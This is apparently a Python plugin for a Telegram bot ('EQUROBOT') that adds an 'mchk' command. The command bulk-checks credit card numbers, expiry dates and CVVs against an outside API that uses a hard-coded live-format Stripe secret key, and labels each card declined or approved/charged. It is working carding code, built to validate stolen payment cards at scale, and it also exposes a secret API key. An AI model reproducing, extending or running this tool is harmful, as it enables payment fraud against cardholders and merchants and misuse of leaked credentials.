from EQUROBOT import app
import aiohttp
import asyncio
import re
import os
from pyrogram import filters

async def process_credit_card(cc_entry):
    try:
        x = re.findall(r'\d+', cc_entry)
        if len(x) != 4:
            return f'Invalid CC format in entry: {cc_entry}\n'

        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]

        VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
        if not ccn.startswith(VALID):
            return f'Invalid CC type in entry: {cc_entry}\n'

        async with aiohttp.ClientSession() as session:
            url = "https://mvy.ai/sk_api/api.php"
            params = {
                "lista": f"{ccn}:{mm}:{yy}:{cvv}",
                "sk": "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"
            }

            async with session.get(url, params=params) as response:
                r = await response.json()

                if r['status'] == 'die':
                    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
                    return f"{fullcc}\nDECLINED ❌ - {r['message']}\n\n"

                elif r['status'] == 'approved':
                    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
                    return f"{fullcc}\nBRAINTREE AUTH $5 ✅ - {r['message']} - CHARGED ${r['payment_info']['amount']}\n\n"

                else:
                    return "Unknown status received.\n\n"

    except Exception as e:
        return f"Error processing CC entry: {e}\n"


async def process_credit_cards_in_file(file_path):
    results = []
    try:
        with open(file_path, 'r') as file:
            tasks = []
            for line in file:
                cc_entry = line.strip()
                task = asyncio.create_task(process_credit_card(cc_entry))
                tasks.append(task)

            results = await asyncio.gather(*tasks)

    except Exception as e:
        results.append(f"Error reading file: {e}\n")

    return results


@app.on_message(filters.command("mchk", prefixes=[".", "/"]))
async def check_cc(_, message):
    command_prefix_length = len(message.text.split()[0])
    cc_entry = message.text[command_prefix_length:].strip()

    reply_msg = message.reply_to_message
    if reply_msg:
        if reply_msg.text:
            cc_entries = reply_msg.text.strip().split('\n')
        elif reply_msg.document:
            file_path = await app.download_media(reply_msg.document.file_id)
            cc_entries = await process_credit_cards_in_file(file_path)
            os.remove(file_path)
        else:
            await message.reply_text("Unsupported reply type.")
            return

        if cc_entries:
            results = await process_credit_card_entries(cc_entries)
            await message.reply_text("\n\n".join(results))
        else:
            await message.reply_text("No valid credit card details found in the reply.")

    elif cc_entry:
        cc_entries = cc_entry.split('\n')
        results = await process_credit_card_entries(cc_entries)
        await message.reply_text("\n\n".join(results))
    else:
        await message.reply_text("Please provide credit card details or reply to a message containing them.")


async def process_credit_card_entries(cc_entries):
    tasks = [asyncio.create_task(process_credit_card(cc_entry)) for cc_entry in cc_entries]
    return await asyncio.gather(*tasks)
